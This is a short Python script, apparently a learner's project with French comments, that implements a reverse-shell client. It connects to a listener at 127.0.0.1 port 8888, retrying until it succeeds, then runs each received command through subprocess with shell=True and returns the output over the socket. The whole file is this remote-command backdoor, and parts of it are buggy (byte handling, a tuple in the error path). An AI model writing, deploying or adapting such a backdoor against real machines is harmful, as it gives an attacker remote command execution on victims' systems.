from copy import error
from http import client
import socket
import time
from time import sleep
import subprocess

PORT = 8888
IP = '127.0.0.1'


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# tentative de connexion au sever, si impossible recommence
while 1:
    try:
        s.connect((IP, PORT))
    except ConnectionError:
        print("Connexion au server inpossible...")
        time.sleep(5)
        continue
    
    print("Connected at server!!")
    break


while 1:

    response = s.recv(1024)
    
    if response != "":
                response_list = response.split()

                try:
                    result = subprocess.run(response_list, shell=True, capture_output=True, text=True, )
                    
                    # si il le canal stdrerr (erreur) n'est pas vide
                    if result.stderr != "":
                        response = result.stdout + "\n\nERREUR: " + result.stderr
                    else: 
                        response = result.stdout
                except:
                    response = "ERREUR INNATTENDU",  error

    
    s.sendall(response.encode())